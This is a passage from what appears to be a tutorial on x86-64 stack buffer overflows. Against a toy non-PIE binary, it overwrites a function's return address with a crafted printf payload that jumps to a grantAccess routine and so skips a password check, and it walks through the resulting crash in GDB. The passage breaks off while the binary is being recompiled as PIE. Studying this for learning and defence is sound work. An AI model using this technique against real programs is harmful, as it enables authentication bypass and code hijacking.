<code>-no-pie</code>: tells linker that the binary is non PIE</p><p>We know that ELF file decides a virtual address for each of the sections, we can check it from the section header table.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ readelf -S vuln_no_pie |  grep -E <span style=color:#e6db74>&#39;.text|.data|.rodata&#39;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>15<span style=color:#f92672>]</span> .text             PROGBITS         00000000004010b0  000010b0
</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>17<span style=color:#f92672>]</span> .rodata           PROGBITS         <span style=color:#ae81ff>0000000000402000</span>  <span style=color:#ae81ff>00002000</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>25<span style=color:#f92672>]</span> .data             PROGBITS         <span style=color:#ae81ff>0000000000404020</span>  <span style=color:#ae81ff>00003020</span>
</span></span></code></pre></div><p>We can see as per the ELF file the <code>.text</code> segment starts at virtual address <code>0x00000000004010b0</code> .</p><p>Let&rsquo;s disassemble the binary and confirm it</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ objdump -d -M intel,mnemonic,no-att -j .text vuln_no_pie
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>vuln_no_pie:     file format elf64-x86-64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Disassembly of section .text:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>00000000004010b0 &lt;_start&gt;:
</span></span><span style=display:flex><span>  4010b0:	f3 0f 1e fa          	endbr64
</span></span><span style=display:flex><span>  4010b4:	<span style=color:#ae81ff>31</span> ed                	xor    ebp,ebp
</span></span><span style=display:flex><span>  4010b6:	<span style=color:#ae81ff>49</span> <span style=color:#ae81ff>89</span> d1             	mov    r9,rdx
</span></span><span style=display:flex><span>  4010b9:	5e                   	pop    rsi
</span></span><span style=display:flex><span>  4010ba:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e2             	mov    rdx,rsp
</span></span><span style=display:flex><span>  4010bd:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>83</span> e4 f0          	and    rsp,0xfffffffffffffff0
</span></span><span style=display:flex><span>  4010c1:	<span style=color:#ae81ff>50</span>                   	push   rax
</span></span><span style=display:flex><span>  4010c2:	<span style=color:#ae81ff>54</span>                   	push   rsp
</span></span><span style=display:flex><span>  4010c3:	<span style=color:#ae81ff>45</span> <span style=color:#ae81ff>31</span> c0             	xor    r8d,r8d
</span></span><span style=display:flex><span>  4010c6:	<span style=color:#ae81ff>31</span> c9                	xor    ecx,ecx
</span></span><span style=display:flex><span>  4010c8:	<span style=color:#ae81ff>48</span> c7 c7 4d <span style=color:#ae81ff>12</span> <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>00</span> 	mov    rdi,0x40124d
</span></span><span style=display:flex><span>  4010cf:	ff <span style=color:#ae81ff>15</span> <span style=color:#ae81ff>03</span> 2f <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>    	call   QWORD PTR <span style=color:#f92672>[</span>rip+0x2f03<span style=color:#f92672>]</span>        <span style=color:#75715e># 403fd8 &lt;__libc_start_main@GLIBC_2.34&gt;</span>
</span></span><span style=display:flex><span>  4010d5:	f4                   	hlt
</span></span><span style=display:flex><span>  4010d6:	<span style=color:#ae81ff>66</span> 2e 0f 1f <span style=color:#ae81ff>84</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	cs nop WORD PTR <span style=color:#f92672>[</span>rax+rax*1+0x0<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>  4010dd:	<span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0000000000401196</span> &lt;grantAccess&gt;:
</span></span><span style=display:flex><span>  401196:	f3 0f 1e fa          	endbr64
</span></span><span style=display:flex><span>  40119a:	<span style=color:#ae81ff>55</span>                   	push   rbp
</span></span><span style=display:flex><span>  40119b:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e5             	mov    rbp,rsp
</span></span><span style=display:flex><span>  40119e:	bf <span style=color:#ae81ff>04</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>00</span>       	mov    edi,0x402004
</span></span><span style=display:flex><span>  4011a3:	e8 c8 fe ff ff       	call   <span style=color:#ae81ff>401070</span> &lt;puts@plt&gt;
</span></span><span style=display:flex><span>  4011a8:	<span style=color:#ae81ff>90</span>                   	nop
</span></span><span style=display:flex><span>  4011a9:	5d                   	pop    rbp
</span></span><span style=display:flex><span>  4011aa:	c3                   	ret
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>00000000004011ab &lt;checkPassword&gt;:
</span></span><span style=display:flex><span>  4011ab:	f3 0f 1e fa          	endbr64
</span></span><span style=display:flex><span>  4011af:	<span style=color:#ae81ff>55</span>                   	push   rbp
</span></span><span style=display:flex><span>  4011b0:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e5             	mov    rbp,rsp
</span></span><span style=display:flex><span>  4011b3:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>83</span> ec <span style=color:#ae81ff>10</span>          	sub    rsp,0x10
</span></span><span style=display:flex><span>  4011b7:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> 7d f8          	mov    QWORD PTR <span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>,rdi
</span></span><span style=display:flex><span>  4011bb:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> <span style=color:#ae81ff>75</span> f0          	mov    QWORD PTR <span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>,rsi
</span></span><span style=display:flex><span>  4011bf:	<span style=color:#ae81ff>48</span> 8b <span style=color:#ae81ff>45</span> f8          	mov    rax,QWORD PTR <span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>  4011c3:	be <span style=color:#ae81ff>13</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>00</span>       	mov    esi,0x402013
</span></span><span style=display:flex><span>  4011c8:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>  4011cb:	e8 c0 fe ff ff       	call   <span style=color:#ae81ff>401090</span> &lt;strcmp@plt&gt;
</span></span><span style=display:flex><span>  4011d0:	<span style=color:#ae81ff>85</span> c0                	test   eax,eax
</span></span><span style=display:flex><span>  4011d2:	<span style=color:#ae81ff>75</span> 0a                	jne    4011de &lt;checkPassword+0x33&gt;
</span></span><span style=display:flex><span>  4011d4:	<span style=color:#ae81ff>48</span> 8b <span style=color:#ae81ff>45</span> f0          	mov    rax,QWORD PTR <span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>  4011d8:	c7 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>    	mov    DWORD PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,0x1
</span></span><span style=display:flex><span>  4011de:	<span style=color:#ae81ff>90</span>                   	nop
</span></span><span style=display:flex><span>  4011df:	c9                   	leave
</span></span><span style=display:flex><span>  4011e0:	c3                   	ret
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>00000000004011e1 &lt;AuthenticateUser&gt;:
</span></span><span style=display:flex><span>  4011e1:	f3 0f 1e fa          	endbr64
</span></span><span style=display:flex><span>  4011e5:	<span style=color:#ae81ff>55</span>                   	push   rbp
</span></span><span style=display:flex><span>  4011e6:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e5             	mov    rbp,rsp
</span></span><span style=display:flex><span>  4011e9:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>83</span> ec <span style=color:#ae81ff>10</span>          	sub    rsp,0x10
</span></span><span style=display:flex><span>  4011ed:	c7 <span style=color:#ae81ff>45</span> f4 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	mov    DWORD PTR <span style=color:#f92672>[</span>rbp-0xc<span style=color:#f92672>]</span>,0x0
</span></span><span style=display:flex><span>  4011f4:	bf 1c <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>00</span>       	mov    edi,0x40201c
</span></span><span style=display:flex><span>  4011f9:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>  4011fe:	e8 7d fe ff ff       	call   <span style=color:#ae81ff>401080</span> &lt;printf@plt&gt;
</span></span><span style=display:flex><span>  401203:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>45</span> f8          	lea    rax,<span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>  401207:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c6             	mov    rsi,rax
</span></span><span style=display:flex><span>  40120a:	bf 2d <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>00</span>       	mov    edi,0x40202d
</span></span><span style=display:flex><span>  40120f:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>  401214:	e8 <span style=color:#ae81ff>87</span> fe ff ff       	call   4010a0 &lt;__isoc99_scanf@plt&gt;
</span></span><span style=display:flex><span>  401219:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>55</span> f4          	lea    rdx,<span style=color:#f92672>[</span>rbp-0xc<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>  40121d:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>45</span> f8          	lea    rax,<span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>  401221:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> d6             	mov    rsi,rdx
</span></span><span style=display:flex><span>  401224:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>  401227:	e8 7f ff ff ff       	call   4011ab &lt;checkPassword&gt;
</span></span><span style=display:flex><span>  40122c:	8b <span style=color:#ae81ff>45</span> f4             	mov    eax,DWORD PTR <span style=color:#f92672>[</span>rbp-0xc<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>  40122f:	<span style=color:#ae81ff>83</span> f8 <span style=color:#ae81ff>01</span>             	cmp    eax,0x1
</span></span><span style=display:flex><span>  401232:	<span style=color:#ae81ff>75</span> 0c                	jne    <span style=color:#ae81ff>401240</span> &lt;AuthenticateUser+0x5f&gt;
</span></span><span style=display:flex><span>  401234:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>  401239:	e8 <span style=color:#ae81ff>58</span> ff ff ff       	call   <span style=color:#ae81ff>401196</span> &lt;grantAccess&gt;
</span></span><span style=display:flex><span>  40123e:	eb 0a                	jmp    40124a &lt;AuthenticateUser+0x69&gt;
</span></span><span style=display:flex><span>  401240:	bf <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>00</span>       	mov    edi,0x402030
</span></span><span style=display:flex><span>  401245:	e8 <span style=color:#ae81ff>26</span> fe ff ff       	call   <span style=color:#ae81ff>401070</span> &lt;puts@plt&gt;
</span></span><span style=display:flex><span>  40124a:	<span style=color:#ae81ff>90</span>                   	nop
</span></span><span style=display:flex><span>  40124b:	c9                   	leave
</span></span><span style=display:flex><span>  40124c:	c3                   	ret
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>000000000040124d &lt;main&gt;:
</span></span><span style=display:flex><span>  40124d:	f3 0f 1e fa          	endbr64
</span></span><span style=display:flex><span>  401251:	<span style=color:#ae81ff>55</span>                   	push   rbp
</span></span><span style=display:flex><span>  401252:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e5             	mov    rbp,rsp
</span></span><span style=display:flex><span>  401255:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>  40125a:	e8 <span style=color:#ae81ff>82</span> ff ff ff       	call   4011e1 &lt;AuthenticateUser&gt;
</span></span><span style=display:flex><span>  40125f:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>  401264:	5d                   	pop    rbp
</span></span><span style=display:flex><span>  401265:	c3                   	ret
</span></span></code></pre></div><p>This confirms that the <code>.text</code> section indeed starts at <code>0x00000000004010b0</code> and the disassembly shows that the address of <code>grantAccess</code> function is <code>0x0000000000401196</code>.</p><p>So if we can overwrite the return address in <code>AuthenticateUser</code> function&rsquo;s stack frame to this address we should be able to achieve the goal.</p><p>We can see <code>isAuthenticated</code> is at <code>[rbp - 0x0C]</code> and <code>password</code> is at <code>[rbp - 0x08]</code> as expected. Since stack grows from higher address to lower addresses and we are on little-endian CPU, <code>password</code> will start at <code>[rbp - 0x08]</code> and end at <code>[rbp - 0x01]</code>.</p><pre tabindex=0><code>                +-------------------------------+
rbp + 8   ---&gt;  | Return address                | &lt;-- overwriting this hijacks control
                +-------------------------------+
rbp       ---&gt;  | Saved RBP                     |
                +-------------------------------+
rbp-0x01  ---&gt;  | password[7]                   |
                |  ....                         |
rbp-0x08  ---&gt;  | password[0]                   |
                +-------------------------------+
rbp-0x0C  ---&gt;  | isAuthenticated               |
                +-------------------------------+
rbp-0x10  ---&gt;  | padding                       |
                +-------------------------------+
</code></pre><p>So the payload we need to build should be like this</p><pre tabindex=0><code>offset 0x00..0x07  : 8 bytes  -&gt; filler for password
offset 0x08..0x0F  : 8 bytes  -&gt; overwrite saved RBP (can be garbage)
offset 0x10..0x17  : 8 bytes  -&gt; overwrite saved RIP with 0x401196 (little-endian)
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ printf <span style=color:#e6db74>&#39;AAAAAAAAAAAAAAAA\x96\x11\x40\x00\x00\x00\x00\x00&#39;</span> | ./vuln_no_pie
</span></span><span style=display:flex><span>Enter password: Authentication Failed
</span></span><span style=display:flex><span>Access Granted
</span></span><span style=display:flex><span>Segmentation fault <span style=color:#f92672>(</span>core dumped<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Here <code>AAAAAAAAAAAAAAAA</code> is 16 bytes, which will overwrite saved RBP, <code>\x96\x11\x40\x00\x00\x00\x00\x00</code> is the address of <code>grantAccess</code> function in little endian format which will overwrite the return address.</p><p>We can see even though the password check failed <strong>Authentication Failed</strong>, we&rsquo;re able to get the access <strong>Access Granted</strong>.</p><p>After this we see <strong>Segmentation fault (core dumped)</strong>.</p><p>We can check kernel logs to see what exactly happened during segmentation fault.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo dmesg | tail -20
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13886.938338<span style=color:#f92672>]</span> vuln_no_pie<span style=color:#f92672>[</span>4028<span style=color:#f92672>]</span>: segfault at 7ffcd8fcd100 ip 00007ffcd8fcd100 sp 00007ffcd8fcd0a8 error <span style=color:#ae81ff>15</span> likely on CPU <span style=color:#ae81ff>6</span> <span style=color:#f92672>(</span>core 2, socket 0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13886.938371<span style=color:#f92672>]</span> Code: <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> d6 1e d4 6e <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>78</span> <span style=color:#ae81ff>01</span> 4e <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 3e <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>10</span> <span style=color:#ae81ff>91</span> <span style=color:#ae81ff>90</span> 5a 7e <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> &lt;d6&gt; 1e <span style=color:#ae81ff>34</span> 6d <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>78</span> <span style=color:#ae81ff>01</span> 4e d6 1e <span style=color:#ae81ff>56</span> 8f 4f e9 4d 4d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> fc 7f
</span></span></code></pre></div><p>Let&rsquo;s load the binary into GDB and see when exactly the Segmentation fault occured.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disass AuthenticateUser
</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> AuthenticateUser:
</span></span><span style=display:flex><span>   0x00000000004011e1 &lt;+0&gt;:	endbr64
</span></span><span style=display:flex><span>   0x00000000004011e5 &lt;+4&gt;:	push   rbp
</span></span><span style=display:flex><span>   0x00000000004011e6 &lt;+5&gt;:	mov    rbp,rsp
</span></span><span style=display:flex><span>   0x00000000004011e9 &lt;+8&gt;:	sub    rsp,0x10
</span></span><span style=display:flex><span>   0x00000000004011ed &lt;+12&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>rbp-0xc<span style=color:#f92672>]</span>,0x0
</span></span><span style=display:flex><span>   0x00000000004011f4 &lt;+19&gt;:	mov    edi,0x40201c
</span></span><span style=display:flex><span>   0x00000000004011f9 &lt;+24&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x00000000004011fe &lt;+29&gt;:	call   0x401080 &lt;printf@plt&gt;
</span></span><span style=display:flex><span>   0x0000000000401203 &lt;+34&gt;:	lea    rax,<span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x0000000000401207 &lt;+38&gt;:	mov    rsi,rax
</span></span><span style=display:flex><span>   0x000000000040120a &lt;+41&gt;:	mov    edi,0x40202d
</span></span><span style=display:flex><span>   0x000000000040120f &lt;+46&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x0000000000401214 &lt;+51&gt;:	call   0x4010a0 &lt;__isoc99_scanf@plt&gt;
</span></span><span style=display:flex><span>   0x0000000000401219 &lt;+56&gt;:	lea    rdx,<span style=color:#f92672>[</span>rbp-0xc<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x000000000040121d &lt;+60&gt;:	lea    rax,<span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x0000000000401221 &lt;+64&gt;:	mov    rsi,rdx
</span></span><span style=display:flex><span>   0x0000000000401224 &lt;+67&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x0000000000401227 &lt;+70&gt;:	call   0x4011ab &lt;checkPassword&gt;
</span></span><span style=display:flex><span>   0x000000000040122c &lt;+75&gt;:	mov    eax,DWORD PTR <span style=color:#f92672>[</span>rbp-0xc<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x000000000040122f &lt;+78&gt;:	cmp    eax,0x1
</span></span><span style=display:flex><span>   0x0000000000401232 &lt;+81&gt;:	jne    0x401240 &lt;AuthenticateUser+95&gt;
</span></span><span style=display:flex><span>   0x0000000000401234 &lt;+83&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x0000000000401239 &lt;+88&gt;:	call   0x401196 &lt;grantAccess&gt;
</span></span><span style=display:flex><span>   0x000000000040123e &lt;+93&gt;:	jmp    0x40124a &lt;AuthenticateUser+105&gt;
</span></span><span style=display:flex><span>   0x0000000000401240 &lt;+95&gt;:	mov    edi,0x402030
</span></span><span style=display:flex><span>   0x0000000000401245 &lt;+100&gt;:	call   0x401070 &lt;puts@plt&gt;
</span></span><span style=display:flex><span>   0x000000000040124a &lt;+105&gt;:	nop
</span></span><span style=display:flex><span>   0x000000000040124b &lt;+106&gt;:	leave
</span></span><span style=display:flex><span>   0x000000000040124c &lt;+107&gt;:	ret
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *0x0000000000401227
</span></span><span style=display:flex><span>Breakpoint <span style=color:#ae81ff>1</span> at 0x401227
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>  run &lt; &lt;<span style=color:#f92672>(</span>printf <span style=color:#e6db74>&#39;AAAAAAAAAAAAAAAA\x96\x11\x40\x00\x00\x00\x00\x00&#39;</span><span style=color:#f92672>)</span>
</span></span></code></pre></div><p>The first breakpoint is after the buffer overflow has already happened</p><p>Let&rsquo;s examine the stack</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/4xg $rbp - <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>0x7fffffffde48:	0x4141414141414141	0x4141414141414141
</span></span><span style=display:flex><span>0x7fffffffde58:	0x0000000000401196	0x00007fffffffdf00
</span></span></code></pre></div><p>We can see saved rbp is overwritten with <code>0x4141414141414141</code> and return address is overwritten with <code>0x0000000000401196</code>.</p><p>Next breakpoint is right after <code>grantAccess</code> is called</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> c
</span></span><span style=display:flex><span>Continuing.
</span></span><span style=display:flex><span>Enter password: Authentication Failed
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Breakpoint 2, 0x0000000000401196 in grantAccess <span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/2xg $rbp - <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>0x4141414141414139:	Cannot access memory at address 0x4141414141414139
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p $rbp
</span></span><span style=display:flex><span>$6 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>void *<span style=color:#f92672>)</span> 0x4141414141414141
</span></span></code></pre></div><p>We can see <code>$rbp</code> contains the overflowed <code>AA...</code> string.</p><p>But after the prologue of <code>grantAccess</code> runs <code>$rbp</code> contains a valid value. Since we have valid value in <code>$rsp</code>, this command <code>mov rbp,rsp</code> will set it set it to <code>$rsp</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disass grantAccess
</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> grantAccess:
</span></span><span style=display:flex><span><span style=color:#f92672>=</span>&gt; 0x0000000000401196 &lt;+0&gt;:	endbr64
</span></span><span style=display:flex><span>   0x000000000040119a &lt;+4&gt;:	push   rbp
</span></span><span style=display:flex><span>   0x000000000040119b &lt;+5&gt;:	mov    rbp,rsp
</span></span><span style=display:flex><span>   0x000000000040119e &lt;+8&gt;:	mov    edi,0x402004
</span></span><span style=display:flex><span>   0x00000000004011a3 &lt;+13&gt;:	call   0x401070 &lt;puts@plt&gt;
</span></span><span style=display:flex><span>   0x00000000004011a8 &lt;+18&gt;:	nop
</span></span><span style=display:flex><span>   0x00000000004011a9 &lt;+19&gt;:	pop    rbp
</span></span><span style=display:flex><span>   0x00000000004011aa &lt;+20&gt;:	ret
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p $rbp
</span></span><span style=display:flex><span>$7 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>void *<span style=color:#f92672>)</span> 0x7fffffffde58
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/2xg $rbp
</span></span><span style=display:flex><span>0x7fffffffde58:	0x4141414141414141	0x00007fffffffdf00
</span></span></code></pre></div><p>We can see the <code>0x4141414141414141</code> is still stored in stack in place of saved rbp again, but the <code>0x00007fffffffdf00</code> is not a valid return address at all, its because we came to <code>grantAccess</code> funcion using the <code>jump</code> instruction which doesn&rsquo;t save the return address unlike <code>call</code> command.</p><p>The address <code>0x00007fffffffdf00</code> is the saved frame pointer (RBP) from main&rsquo;s stack frame</p><pre tabindex=0><code>Stack of main:
+-------------------------------+
| Return address (to libc)      | ← 0x00007ffff7c2a1ca
+-------------------------------+
| Saved RBP (from main)         | ← 0x00007fffffffdf00 ← THIS ONE!
+-------------------------------+
| main&#39;s local variables        |
+-------------------------------+
</code></pre><p>The CPU tries to execute code at <code>0x00007fffffffdf00</code>, but this address contains stack data (main&rsquo;s saved RBP), not executable code.</p><p>So this is the value which causes the segfault, not the garbage value we entered.</p><h4 id=position-independent-executable-without-aslr>Position Independent Executable Without ASLR<a hidden class=anchor aria-hidden=true href=#position-independent-executable-without-aslr>#</a></h4><p>Now let&rsquo;s compile the binary without <code>-fno-pie</code> and <code>-no-pie</code> which will compile the binary into a Position Independent Executable which is a default in GCC.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc  -fno-stack-protector -O0 -o vuln main
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ objdump -d -M intel,mnemonic,no-att -j .text vuln
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>vuln:     file format elf64-x86-64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Disassembly of section .text:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>00000000000010c0 &lt;_start&gt;:
</span></span><span style=display:flex><span>    10c0:	f3 0f 1e fa          	endbr64
</span></span><span style=display:flex><span>    10c4:	<span style=color:#ae81ff>31</span> ed                	xor    ebp,ebp
</span></span><span style=display:flex><span>    10c6:	<span style=color:#ae81ff>49</span> <span style=color:#ae81ff>89</span> d1             	mov    r9,rdx
</span></span><span style=display:flex><span>    10c9:	5e                   	pop    rsi
</span></span><span style=display:flex><span>    10ca:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e2             	mov    rdx,rsp
</span></span><span style=display:flex><span>    10cd:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>83</span> e4 f0          	and    rsp,0xfffffffffffffff0
</span></span><span style=display:flex><span>    10d1:	<span style=color:#ae81ff>50</span>                   	push   rax
</span></span><span style=display:flex><span>    10d2:	<span style=color:#ae81ff>54</span>                   	push   rsp
</span></span><span style=display:flex><span>    10d3:	<span style=color:#ae81ff>45</span> <span style=color:#ae81ff>31</span> c0             	xor    r8d,r8d
</span></span><span style=display:flex><span>    10d6:	<span style=color:#ae81ff>31</span> c9                	xor    ecx,ecx
</span></span><span style=display:flex><span>    10d8:	<span style=color:#ae81ff>48</span> 8d 3d 9a <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rdi,<span style=color:#f92672>[</span>rip+0x19a<span style=color:#f92672>]</span>        <span style=color:#75715e># 1279 &lt;main&gt;</span>
